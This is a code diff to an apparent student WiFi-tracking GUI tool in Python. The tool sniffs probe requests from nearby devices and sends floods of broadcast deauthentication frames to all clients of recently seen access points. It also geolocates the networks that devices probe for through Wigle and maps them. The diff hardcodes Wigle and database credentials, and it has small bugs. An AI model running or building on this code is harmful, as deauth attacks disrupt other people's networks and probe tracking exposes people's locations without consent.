@@ -7,6 +7,7 @@ from Outlog import OutLog
 from impacket.dot11 import RadioTap
 from scapy.layers.dot11 import Dot11Deauth
 from probe_scan import encodeMac
+from gmplot.gmplot import GoogleMapPlotter
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Shut up Scapy
 from scapy.all import *
 conf.verb = 0 # Scapy I thought I told you to shut up
@@ -15,7 +16,7 @@ import probe_scan
 import psycopg2
 import manuf
 from psycopg2.extensions import ISOLATION_LEVEL_AUTOCOMMIT
-import sys
+
 
 class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow (also QWidget can be used); Window is an object
 
@@ -144,8 +145,6 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 		btn1.resize(180, 40)					#Defines the size of the button (width; length) or PyQt suggest minimum size btn1.minimumSizeHint()
 		btn1.move(25, 50)					#Defines location of the button on the screen (starting X; starting Y)
 									#Button for Scanning Probes
-		#self.progress = QtGui.QProgressBar(self)
-		#self.progress.setGeometry(50, 620, 1100, 20)
 		
 		btn2 = QtGui.QPushButton("Launch Probe Scan", self)	#Defines a button with parameter name
 		btn2.clicked.connect(self.probe_scan)			#Defines an event (through .connect), event is Scanning Probes
@@ -190,12 +189,6 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 
 	# ===== Methods ===== 
 	
-	
-	#def slot_1(self,text):					#Defines the method of the style choice (the 'Doing something' with the choice)...
-	#	print str(deviceModel)
-	#	return str(deviceModel)
-		
-		
 	def wifi_monitor(self):						#Method for closing application
 		try:
 			wifi_mon.start_mon_mode(iface)
@@ -207,12 +200,8 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 		choice = QtGui.QMessageBox.question(self, "Start sniffing", "Start collecting probes on interface %s?"% (iface), QtGui.QMessageBox.Yes | QtGui.QMessageBox.No)
 		if choice == QtGui.QMessageBox.Yes:			#if/else statement - if yes
 			print("Starting probes collection")	#Sends a message before quiting (in cmd & loggs)
-			#self.completed = 0
-			#while self.completed < 100:
-			#	self.completed += 0.0001
-			#	self.progress.setValue(self.completed)
 			handler = probe_scan.Handler()                
-			sniff = probe_scan.sniff(iface=iface,prn=handler,store=0,timeout=300)
+			sniff = probe_scan.sniff(iface=iface,prn=handler,store=0,timeout=60)
 			self.comboBox.clear()
 			self.comboBox.update()
 		else:							#if/else statement - else (No)
@@ -229,13 +218,15 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 					cur.execute("""select distinct s.mac from beacon b join station s on b.station =s.id where b.seen > current_timestamp at time zone 'utc' - (30 * interval '10 minutes');""")
 					ssids = [item[0] for item in cur.fetchall()]
 					for ssid in ssids:
-						print("Following AP clients will be deauthed " + ssid)
+						print("All clients of following APs will be deauthed " + ssid)## wlan.fc.type_subtype eq 12  wireshark fil
 						brdmac = "ff:ff:ff:ff:ff:ff"
-						pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = str(ssid), addr3 = ssid) / Dot11Deauth()
-						sendp(pkt, inter = .2, iface = iface, count = 10)
+						pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = ssid, addr3 = ssid) / Dot11Deauth()
+						sendp(pkt, inter = .2, iface = iface, count = 100)
 				except psycopg2.DatabaseError, e:
 					print 'Error %s' % e    
 				QtGui.QMessageBox.information(self, "Deauth", "Deauth started")
+				cur.close()
+				con.close()
 			except Exception, msg:
 				print msg
 		else:							#if/else statement - else (No)
@@ -251,7 +242,9 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 		except psycopg2.DatabaseError, e:
 			print 'Error %s' % e    
 		return stations
-	
+		cur.close()
+		con.close()
+		
 	def getCoordinates(self,text):
 		con = psycopg2.connect(database='wifi', user='probecap', host = 'localhost', password='pass')
 		con.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)
@@ -260,27 +253,41 @@ class Window(QtGui.QMainWindow):				#Application inherit from QtGui.QMainWindow 
 			cur.execute("select s.name from probe p join ssid s on p.ssid = s.id join station st on p.station = st.id where st.model = %s;", (str(text),))
 			data = cur.fetchall()
 			for item in data:
-				print item
 				try:
-					results = Wigle('itbstudent', 'p@SSW0RD').search(
-		            ssid=item,
-		            max_results=10) ###add more parameters to search, like lat and lon range for EIRE, time, etc.
+					results = Wigle('itbstudent', 'p@SSW0RD').search(ssid=item,max_results=100) ###add more parameters to search, like lat and lon range for EIRE, time, etc.
+					lats = []
+					longis = []
 					for result in results:
-						print("%(ssid)s, %(trilat)s, %(trilong)s" % result)
+					#	print("%(ssid)s, %(trilat)s, %(trilong)s" % result)
+						#AP = ("%(ssid)s" % result)
+						#APs = []
+						#if AP:
+						#	APs.append(AP)
+						lat = ("%(trilat)s" % result)
+						if lat != None:
+							lats.append(float(lat))
 						
+						longi = ("%(trilong)s" % result)
+						if long != None:
+							longis.append(float(longi))	
+						#print APs
+						print ("all longs" + str(longis))
+						print ("all lats" + str(lats))
+					gmap = GoogleMapPlotter(53.404800, -6.378041, 9)
+					plot = gmap.scatter(lats,longis,'k', marker=True)
+					drawmap = gmap.draw("default.html")
+					web_page = QWebView(self)
+					web_page.setGeometry(500,40,515,515)
+					web_page.load(QUrl("file:///root/git/WiFi-tracker/default.html"))
+					web_page.show()									
 				except WigleRatelimitExceeded:
 					print("Cannot query Wigle - exceeded number of allowed requests")
-				#cred = Wigle('itbstudent', 'p@SSW0RD')
-				#data = cred.search(ssid='row')
-				
+		
 		except psycopg2.DatabaseError, e:
-			print 'Error %s' % e    
+			print 'Error %s' % e
+		cur.close()
+		con.close()
 			
-	def showMap(self):
-		web_page = QWebView(self)
-		web_page.setGeometry(650,50,500,500)
-		web_page.load(QUrl("file:///var/www/html/mymap7.html"))
-		web_page.show()									
 		
 	def close_application(self):					#Method for closing application
 										#Pop up question box with yes/no option; parameters: self, Wwindow title, Question, Yes or No
